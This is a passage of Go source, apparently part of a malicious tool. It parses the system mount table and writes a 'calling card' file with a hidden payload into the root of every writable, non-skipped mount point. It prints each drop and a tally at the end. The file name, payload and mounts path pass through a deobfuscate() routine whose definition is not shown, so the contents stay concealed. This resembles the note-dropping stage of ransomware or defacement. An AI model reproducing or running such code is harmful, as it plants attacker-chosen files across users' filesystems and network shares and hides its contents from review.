// mountEntry mirrors the relevant columns of /proc/mounts:
//   device mountpoint fstype options ...
type mountEntry struct {
	device, mountpoint, fstype, options string
}

func parseMounts(path string) ([]mountEntry, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var entries []mountEntry
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) < 4 {
			continue
		}
		entries = append(entries, mountEntry{
			device:     fields[0],
			mountpoint: fields[1],
			fstype:     fields[2],
			options:    fields[3],
		})
	}
	return entries, scanner.Err()
}

func isSkippable(fstype string, skip map[string]bool) bool {
	return skip[fstype]
}

func isReadOnly(options string) bool {
	for _, opt := range strings.Split(options, ",") {
		if opt == "ro" {
			return true
		}
	}
	return false
}

func dropCallingCard(mountpoint, filename, payload string) error {
	target := filepath.Join(mountpoint, filename)
	return os.WriteFile(target, []byte(payload), 0o644)
}

func main() {
	filename := deobfuscate(sFilename)
	payload := deobfuscate(sPayload)
	mountsPath := deobfuscate(sMountsPath)

	skip := map[string]bool{}
	for _, t := range strings.Fields(deobfuscate(sSkipPrefixes)) {
		skip[t] = true
	}

	entries, err := parseMounts(mountsPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "parse mounts: %v\n", err)
		os.Exit(1)
	}

	written, skipped, failed := 0, 0, 0
	for _, e := range entries {
		if isSkippable(e.fstype, skip) || isReadOnly(e.options) {
			skipped++
			continue
		}
		if err := dropCallingCard(e.mountpoint, filename, payload); err != nil {
			failed++
			continue
		}
		written++
		fmt.Printf("dropped: %s\n", filepath.Join(e.mountpoint, filename))
	}

	fmt.Printf("\nsummary: %d written, %d skipped, %d failed\n", written, skipped, failed)
}
